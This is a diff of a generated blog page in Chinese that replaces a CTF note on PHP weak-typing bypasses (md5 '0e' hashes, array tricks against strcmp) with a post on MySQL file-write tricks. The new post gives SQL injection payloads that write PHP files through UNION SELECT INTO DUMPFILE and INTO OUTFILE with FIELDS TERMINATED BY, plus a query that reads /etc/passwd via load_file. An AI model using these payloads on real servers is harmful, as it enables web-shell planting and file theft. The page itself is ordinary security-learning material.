@@ -81,22 +81,22 @@
 
 
 
-<meta name="description" content="md5()漏洞&amp;nbsp;&amp;nbsp;PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。常见的payload有&amp;nbsp;&amp;nbsp;同时MD5不能处理数组，若有以下判断则可用数组绕过判断代码：if($v1 != $v2 &amp;amp;&amp;">
+<meta name="description" content="1.用UNION写入&amp;nbsp;&amp;nbsp;http://url/?id=1 and 0 union select 1,2 ,’&amp;lt;?php phpinfo(); ?&amp;gt;’ into dumpfile ‘文件绝对路径’&amp;nbsp;&amp;nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，但是如果用来写bat,m">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctf中遇到关于PHP的漏洞总结">
-<meta property="og:url" content="https://twosmi1e.github.io/2018/02/01/PHP弱类型导致的漏洞总结/index.html">
+<meta property="og:title" content="Mysql写入文件小技巧">
+<meta property="og:url" content="https://twosmi1e.github.io/2018/02/10/Mysql写入文件小技巧/index.html">
 <meta property="og:site_name" content="Two_smi1e">
-<meta property="og:description" content="md5()漏洞&amp;nbsp;&amp;nbsp;PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。常见的payload有&amp;nbsp;&amp;nbsp;同时MD5不能处理数组，若有以下判断则可用数组绕过判断代码：if($v1 != $v2 &amp;amp;&amp;">
-<meta property="og:image" content="http://i2.bvimg.com/616806/5e4ef5f2e54ef602.png">
-<meta property="og:image" content="http://i2.bvimg.com/616806/974aceb1c0cc80ee.png">
-<meta property="og:image" content="http://i2.bvimg.com/616806/b3e7e00d1141563e.png">
-<meta property="og:image" content="http://i2.bvimg.com/616806/7b688f8933689402.png">
-<meta property="og:image" content="http://i2.bvimg.com/616806/f0533fb0ee251fe5.png">
-<meta property="og:updated_time" content="2018-02-27T14:43:30.151Z">
+<meta property="og:description" content="1.用UNION写入&amp;nbsp;&amp;nbsp;http://url/?id=1 and 0 union select 1,2 ,’&amp;lt;?php phpinfo(); ?&amp;gt;’ into dumpfile ‘文件绝对路径’&amp;nbsp;&amp;nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，但是如果用来写bat,m">
+<meta property="og:image" content="http://i1.bvimg.com/616806/aef6254a1b3eb443.png">
+<meta property="og:image" content="http://i1.bvimg.com/616806/2a8ed815fdf95385.png">
+<meta property="og:image" content="https://tu.aixinxi.net/views/pic.php?key=2e520044c7673af2224b68a50895c3fe">
+<meta property="og:image" content="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-w.jpg">
+<meta property="og:image" content="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg">
+<meta property="og:updated_time" content="2018-02-27T15:18:01.871Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ctf中遇到关于PHP的漏洞总结">
-<meta name="twitter:description" content="md5()漏洞&amp;nbsp;&amp;nbsp;PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。常见的payload有&amp;nbsp;&amp;nbsp;同时MD5不能处理数组，若有以下判断则可用数组绕过判断代码：if($v1 != $v2 &amp;amp;&amp;">
-<meta name="twitter:image" content="http://i2.bvimg.com/616806/5e4ef5f2e54ef602.png">
+<meta name="twitter:title" content="Mysql写入文件小技巧">
+<meta name="twitter:description" content="1.用UNION写入&amp;nbsp;&amp;nbsp;http://url/?id=1 and 0 union select 1,2 ,’&amp;lt;?php phpinfo(); ?&amp;gt;’ into dumpfile ‘文件绝对路径’&amp;nbsp;&amp;nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，但是如果用来写bat,m">
+<meta name="twitter:image" content="http://i1.bvimg.com/616806/aef6254a1b3eb443.png">
 
 
 
@@ -126,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="https://twosmi1e.github.io/2018/02/01/PHP弱类型导致的漏洞总结/"/>
+  <link rel="canonical" href="https://twosmi1e.github.io/2018/02/10/Mysql写入文件小技巧/"/>
 
 
 
 
 
-  <title>ctf中遇到关于PHP的漏洞总结 | Two_smi1e</title>
+  <title>Mysql写入文件小技巧 | Two_smi1e</title>
   
 
 
@@ -249,7 +249,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://twosmi1e.github.io/2018/02/01/PHP弱类型导致的漏洞总结/">
+    <link itemprop="mainEntityOfPage" href="https://twosmi1e.github.io/2018/02/10/Mysql写入文件小技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="two_smi1e">
@@ -266,7 +266,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ctf中遇到关于PHP的漏洞总结</h1>
+          <h1 class="post-title" itemprop="name headline">Mysql写入文件小技巧</h1>
         
 
         <div class="post-meta">
@@ -278,8 +278,8 @@
               
                 <span class="post-meta-item-text">Veröffentlicht am</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-02-01T21:02:58+08:00">
-                2018-02-01
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-02-10T23:03:01+08:00">
+                2018-02-10
               </time>
             
 
@@ -316,8 +316,8 @@
       
 
       
-        <h1 id="md5-漏洞"><a href="#md5-漏洞" class="headerlink" title="md5()漏洞"></a>md5()漏洞</h1><p>&nbsp;&nbsp;PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>常见的payload有<br><img src="http://i2.bvimg.com/616806/5e4ef5f2e54ef602.png" alt=""><br>&nbsp;&nbsp;同时MD5不能处理数组，若有以下判断则可用数组绕过<br><img src="http://i2.bvimg.com/616806/974aceb1c0cc80ee.png" alt=""><br>判断代码：<br>if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))</p>
-<h1 id="strcmp-漏洞"><a href="#strcmp-漏洞" class="headerlink" title="strcmp()漏洞"></a>strcmp()漏洞</h1><p><img src="http://i2.bvimg.com/616806/b3e7e00d1141563e.png" alt=""><br>&nbsp;&nbsp;参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。<br><img src="http://i2.bvimg.com/616806/7b688f8933689402.png" alt=""><br>&nbsp;&nbsp;对于这段代码，我们能用什么办法绕过验证呢， 只要我们$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢。<br>其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key），当作一个名字为xxx的数组构造类似如下的request<br><img src="http://i2.bvimg.com/616806/f0533fb0ee251fe5.png" alt=""></p>
+        <h1 id="1-用UNION写入"><a href="#1-用UNION写入" class="headerlink" title="1.用UNION写入"></a>1.用UNION写入</h1><p>&nbsp;&nbsp;<a href="http://url/?id=1" target="_blank" rel="external">http://url/?id=1</a> and 0 union select 1,2 ,’&lt;?php phpinfo(); ?&gt;’ into dumpfile ‘文件绝对路径’<br><img src="http://i1.bvimg.com/616806/aef6254a1b3eb443.png" alt=""><br>&nbsp;&nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，<br>但是如果用来写bat,mof,vbs等文件就会出问题了，那么怎么去掉这个只写入我们需要的内容呢？采用hex编码就好了。<br><img src="http://i1.bvimg.com/616806/2a8ed815fdf95385.png" alt=""><br>&nbsp;&nbsp;将我们要写入的内容使用hex编码在分段写在每个字段位上，这样就可以只写入我们需要的内容了。</p>
+<h1 id="2-不支持union注入时-用terminated-by"><a href="#2-不支持union注入时-用terminated-by" class="headerlink" title="2.不支持union注入时 用terminated by"></a>2.不支持union注入时 用terminated by</h1><p>&nbsp;&nbsp;语法：select <em> from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23<br><img src="https://tu.aixinxi.net/views/pic.php?key=2e520044c7673af2224b68a50895c3fe" alt=""><br>&nbsp;&nbsp;可以看到成功写入，但是这个方法有一个弊病就是查询出来的数据必须大于或等于2以上才可以写入内容，写入的内容数=查询出来的数据-1<br>可以看到，当我们使前面的数据出错查不到数据的时候，写入是失败的。<br>看看sqlmap中的情况：<br><img src="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-w.jpg" alt=""><br>&nbsp;&nbsp;可以很明显的看到sqlmap中也有这种办法写入。（burp抓取sqlmap数据包：加上 –proxy “<a href="http://127.0.0.1:8080/" target="_blank" rel="external">http://127.0.0.1:8080/</a>“; 在burp里可以看到请求）<br><img src="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg" alt=""><br>当然可以看到也通过了常规的union写入文件。<br>同时附上一个函数exp()。通过这个函数也可以读取文件，但是写文件只能写入一个内容为0的文件，这里就必须结合其他的漏洞利用了，如：文件覆盖之类的。<br>读文件：<br>select exp(~(select</em>from(select load_file(‘/etc/passwd’))a));<br>写文件：<br>select exp(~(select*from(select ‘hello’)a)) into outfile ‘C:/out.txt’;  //但是只能写一个0进去。</p>
 
       
     </div>
@@ -342,15 +342,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/02/02/Python高级特性/" rel="next" title="Python高级特性">
+                <i class="fa fa-chevron-left"></i> Python高级特性
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/02/02/Python高级特性/" rel="prev" title="Python高级特性">
-                Python高级特性 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -478,7 +478,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#md5-漏洞"><span class="nav-number">1.</span> <span class="nav-text">md5()漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#strcmp-漏洞"><span class="nav-number">2.</span> <span class="nav-text">strcmp()漏洞</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-用UNION写入"><span class="nav-number">1.</span> <span class="nav-text">1.用UNION写入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-不支持union注入时-用terminated-by"><span class="nav-number">2.</span> <span class="nav-text">2.不支持union注入时 用terminated by</span></a></li></ol></div>
             
 
           </div>
